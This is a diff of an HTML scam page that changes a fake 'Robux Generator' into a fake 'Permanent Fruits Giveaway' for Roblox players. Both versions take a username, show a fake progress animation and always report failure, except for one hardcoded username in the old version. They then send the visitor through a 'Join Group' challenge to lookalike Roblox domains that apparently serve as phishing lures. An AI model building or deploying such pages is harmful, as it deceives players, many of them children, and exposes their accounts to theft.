@@ -3,181 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robux Generator</title>
+    <title>Permanent Fruits Giveaway</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap">
     <style>
-        /* Dark void-themed styles */
         body {
             background-color: #0a0a0a;
             color: white;
-            font-family: Arial, sans-serif;
+            font-family: 'Orbitron', sans-serif;
             text-align: center;
+            margin: 0;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
-            margin: 0;
         }
+
         .container {
-            background: #111;
+            background: rgba(20, 20, 20, 0.9);
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
-            max-width: 400px;
+            box-shadow: 0px 0px 15px rgba(150, 0, 255, 0.7);
+            width: 350px;
+        }
+
+        .title {
+            font-size: 24px;
+            text-shadow: 0 0 10px #ff00ff;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        input, select, button {
             width: 90%;
-            opacity: 0;
-            transform: scale(0.9);
-            animation: fadeIn 0.5s forwards;
-        }
-        input {
-            width: 80%;
             padding: 10px;
-            margin: 10px 0;
+            margin-top: 10px;
             border: none;
-            border-radius: 5px;
-            text-align: center;
-        }
-        .glow-button {
-            background-color: #00ccff;
-            color: black;
-            border: none;
-            padding: 10px 15px;
-            cursor: pointer;
+            outline: none;
             font-size: 16px;
             border-radius: 5px;
+        }
+
+        input {
+            background: #222;
+            color: white;
+        }
+
+        select {
+            background: #111;
+            color: white;
+        }
+
+        button {
+            background: #6f00ff;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
             transition: 0.3s;
-            margin: 5px;
         }
-        .glow-button:hover {
-            box-shadow: 0 0 10px #00ccff;
+
+        button:hover {
+            background: #9a00ff;
         }
-        .loading-animation {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 10px;
-            opacity: 0;
-            transform: scale(0.9);
+
+        .status {
+            margin-top: 20px;
+            font-size: 16px;
+            animation: fadeIn 1s ease-in-out;
         }
-        .dot {
-            width: 10px;
-            height: 10px;
-            background-color: white;
-            border-radius: 50%;
-            animation: bounce 1.2s infinite ease-in-out;
-        }
-        .dot:nth-child(2) { animation-delay: 0.2s; }
-        .dot:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes bounce {
-            0%, 80%, 100% { transform: scale(0); }
-            40% { transform: scale(1); }
-        }
-        .robux-options, .confirmation, #loading-text {
+
+        .hidden {
             display: none;
-            opacity: 0;
-            transform: scale(0.9);
         }
+
+        #challenge {
+            background: rgba(30, 30, 30, 0.9);
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 5px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        a {
+            color: #ff00ff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
         @keyframes fadeIn {
-            to { opacity: 1; transform: scale(1); }
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes loading {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-circle {
+            width: 30px;
+            height: 30px;
+            border: 4px solid transparent;
+            border-top: 4px solid #ff00ff;
+            border-radius: 50%;
+            margin: 10px auto;
+            animation: loading 1s linear infinite;
         }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <h1 id="title">Enter your Roblox Username</h1>
-        <input type="text" id="username" placeholder="Username">
-        <button class="glow-button" onclick="startLoading()">Continue</button>
+        <h1 class="title">Permanent Fruits Giveaway</h1>
+        <p class="subtitle">Enter your Roblox username and select your fruit.</p>
 
-        <p id="loading-text">Finding user...</p>
-        <div class="loading-animation" id="loading-animation">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
+        <input type="text" id="username" placeholder="Enter your Roblox username">
+        <select id="fruit">
+            <option value="Dragon">Permanent Dragon</option>
+            <option value="Leopard">Permanent Leopard</option>
+            <option value="Dough">Permanent Dough</option>
+            <option value="Venom">Permanent Venom</option>
+            <option value="Shadow">Permanent Shadow</option>
+            <option value="Yeti">Permanent Yeti</option>
+            <option value="Buddha">Permanent Buddha</option>
+            <option value="Phoenix">Permanent Phoenix</option>
+            <option value="Light">Permanent Light</option>
+            <option value="Dark">Permanent Dark</option>
+            <option value="Ice">Permanent Ice</option>
+            <option value="Magma">Permanent Magma</option>
+            <option value="Rubber">Permanent Rubber</option>
+        </select>
+
+        <button id="enterBtn">Enter</button>
+
+        <div id="status" class="status"></div>
+        <div class="loading-circle hidden" id="loading"></div>
+
+        <div id="challenge" class="hidden">
+            <p>⚠️ Complete Our Challenge to Claim ⚠️</p>
+            <p>Join Our Group: <span id="progress">0/1</span></p>
+            <a href="https://www.ro.blox.com.es/communities/3189706619/BloxGain" target="_blank">Join Now</a>
         </div>
-
-        <div class="robux-options">
-            <h2>Select the amount of Robux</h2>
-            <button class="glow-button" onclick="confirmRobux(1000)">1,000 Robux</button>
-            <button class="glow-button" onclick="confirmRobux(2000)">2,000 Robux</button>
-            <button class="glow-button" onclick="confirmRobux(3000)">3,000 Robux</button>
-            <button class="glow-button" onclick="confirmRobux(4000)">4,000 Robux</button>
-            <button class="glow-button" onclick="confirmRobux(5000)">5,000 Robux</button>
-            <button class="glow-button" onclick="confirmRobux(6000)">6,000 Robux</button>
-        </div>
-
-        <div class="confirmation" id="confirmation">
-            <h2 id="confirmation-text"></h2>
-            <p id="final-message"></p>
-        </div>
-
     </div>
 
     <script>
-        function startLoading() {
-            let username = document.getElementById("username").value;
-            if (!username) {
-                alert("Please enter a valid username.");
+        document.getElementById("enterBtn").addEventListener("click", function() {
+            let username = document.getElementById("username").value.trim();
+            let fruit = document.getElementById("fruit").value;
+            let statusDiv = document.getElementById("status");
+            let loadingDiv = document.getElementById("loading");
+            let challengeDiv = document.getElementById("challenge");
+
+            if (username === "") {
+                statusDiv.innerHTML = "❌ Please enter your Roblox username!";
                 return;
             }
 
-            let title = document.getElementById("title");
-            let input = document.getElementById("username");
-            let button = document.querySelector(".glow-button");
-
-            title.style.opacity = "0";
-            input.style.opacity = "0";
-            button.style.opacity = "0";
-            setTimeout(() => {
-                title.style.display = "none";
-                input.style.display = "none";
-                button.style.display = "none";
-            }, 500);
-
-            let loadingText = document.getElementById("loading-text");
-            let loadingAnim = document.getElementById("loading-animation");
-
-            loadingText.style.display = "block";
-            loadingAnim.style.display = "flex";
+            statusDiv.innerHTML = `Giving Permanent ${fruit} to ${username}...`;
+            loadingDiv.classList.remove("hidden");
 
             setTimeout(() => {
-                loadingText.style.animation = "fadeIn 0.5s forwards";
-                loadingAnim.style.animation = "fadeIn 0.5s forwards";
-            }, 100);
-
-            setTimeout(() => {
-                loadingText.style.opacity = "0";
-                loadingAnim.style.opacity = "0";
-                setTimeout(() => {
-                    loadingText.style.display = "none";
-                    loadingAnim.style.display = "none";
-                    document.querySelector(".robux-options").style.display = "block";
-                    document.querySelector(".robux-options").style.animation = "fadeIn 0.5s forwards";
-                }, 500);
+                loadingDiv.classList.add("hidden");
+                statusDiv.innerHTML = `❌ Failed to give Permanent ${fruit} to ${username}`;
+                challengeDiv.classList.remove("hidden");
             }, 3000);
-        }
-
-        function confirmRobux(amount) {
-            let username = document.getElementById("username").value;
-            document.querySelector(".robux-options").style.opacity = "0";
-            setTimeout(() => {
-                document.querySelector(".robux-options").style.display = "none";
-                document.getElementById("confirmation").style.display = "block";
-                document.getElementById("confirmation").style.animation = "fadeIn 0.5s forwards";
-                document.getElementById("confirmation-text").innerText = `Sending ${amount} Robux to ${username}...`;
-            }, 500);
-
-            setTimeout(() => {
-                if (username.toLowerCase() === "vurqts") {
-                    document.getElementById("confirmation-text").innerText = "Robux Sent Successfully!";
-                    document.getElementById("final-message").innerText = "Enjoy your Robux!";
-                } else {
-                    document.getElementById("confirmation-text").innerText = "❌ Failed to give Robux, You didn't join our group.";
-                    document.getElementById("final-message").innerHTML = `<button class="glow-button" onclick="window.location.href='https://roblox.tg/groups/4071074314/'">Join Group</button>`;
-                }
-            }, 3000);
-        }
+        });
     </script>
-
 </body>
 </html>
